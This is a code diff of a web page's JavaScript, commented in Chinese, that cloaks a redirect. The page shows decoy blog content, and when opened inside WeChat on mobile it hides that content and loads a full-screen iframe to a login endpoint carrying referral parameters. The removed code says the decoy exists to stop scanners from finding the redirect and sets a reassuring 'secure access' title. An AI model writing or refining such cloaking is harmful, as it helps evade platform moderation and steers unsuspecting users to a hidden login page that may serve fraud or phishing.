@@ -50,65 +50,53 @@
     <iframe id="business-frame"></iframe>
 
     <script>
-        (function() {
-            /** 
-             * 1. 配置区域 
-             */
-            const config = {
-                // 你的业务域名（末尾不要带斜杠）
-                domain: 'https://1004.jdnews.cn',
-                // 默认的 app_id
-                defaultAppId: '10001',
-                // 业务接口路径
-                apiPath: '/index.php/api/user.usermp/login'
-            };
+(function() {
+    /** 1. 配置区域 */
+    const config = {
+        domain: 'https://1004.jdnews.cn',
+        appId: '10001',
+        apiPath: '/index.php/api/user.usermp/login'
+    };
 
-            /**
-             * 2. 环境检测
-             */
-            const ua = navigator.userAgent.toLowerCase();
-            const isWechat = ua.indexOf('micromessenger') !== -1;
-            const isMobile = /iphone|ipad|ipod|android/.test(ua);
+    /** 2. 环境检测 */
+    const ua = navigator.userAgent.toLowerCase();
+    const isWechat = ua.indexOf('micromessenger') !== -1;
+    const isMobile = /iphone|ipad|ipod|android/.test(ua);
 
-            /**
-             * 3. 参数解析与 URL 构建
-             */
-            const urlParams = new URLSearchParams(window.location.search);
-            const rawC = urlParams.get('c'); // 获取 ?c= 之后加密的内容
+    /** 3. 解析参数 */
+    const urlParams = new URLSearchParams(window.location.search);
+    const rawC = urlParams.get('c');
 
-            if (isWechat && isMobile && rawC) {
-                // 解码 c 里面的业务参数
-                const decodedParams = decodeURIComponent(rawC);
-                const businessParams = new URLSearchParams(decodedParams);
+    function buildUrl(rawC) {
+        // 解码 c 参数
+        const decoded = decodeURIComponent(rawC);
+        const p = new URLSearchParams(decoded);
 
-                // 自动补充 app_id (如果 c 里面没传则用默认的)
-                if (!businessParams.has('app_id')) {
-                    businessParams.set('app_id', config.defaultAppId);
-                }
+        // 逐个取出参数，明确构建，确保 app_id 一定存在
+        const finalParams = new URLSearchParams();
+        if (p.get('referee_id'))       finalParams.set('referee_id',       p.get('referee_id'));
+        if (p.get('shop_supplier_id')) finalParams.set('shop_supplier_id', p.get('shop_supplier_id'));
+        finalParams.set('app_id', config.appId);                           // 强制写入
+        finalParams.set('t', Math.floor(Date.now() / 1000));               // 时间戳
 
-                // 自动补充当前时间戳 t
-                businessParams.set('t', Math.floor(Date.now() / 1000));
+        return config.domain + config.apiPath + '?' + finalParams.toString();
+    }
 
-                // 构建最终的业务 URL
-                const finalUrl = config.domain + config.apiPath + '?' + businessParams.toString();
+    if (rawC) {
+        const finalUrl = buildUrl(rawC);
 
-                /**
-                 * 4. 执行跳转（在微信内使用全屏 Iframe）
-                 */
-                const decoy = document.getElementById('decoy-content');
-                const frame = document.getElementById('business-frame');
-                
-                decoy.style.display = 'none'; // 隐藏伪装内容
-                frame.style.display = 'block'; // 显示业务 Iframe
-                frame.src = finalUrl;          // 加载业务页面
-                
-                // 兼容性处理：修改标题
-                document.title = '正在安全访问...';
-            } else {
-                // 非微信环境或无参数：保持显示博客内容，防止被扫描员发现跳转
-                console.log('Decoy mode active.');
-            }
-        })();
+        if (isWechat && isMobile) {
+            // 微信内：全屏 Iframe 加载
+            document.getElementById('decoy-content').style.display = 'none';
+            const frame = document.getElementById('business-frame');
+            frame.style.display = 'block';
+            frame.src = finalUrl;
+        } else {
+            // 非微信（PC/测试）：直接跳转，方便你在浏览器里测试
+            location.replace(finalUrl);
+        }
+    }
+})();
     </script>
 </body>
 </html>
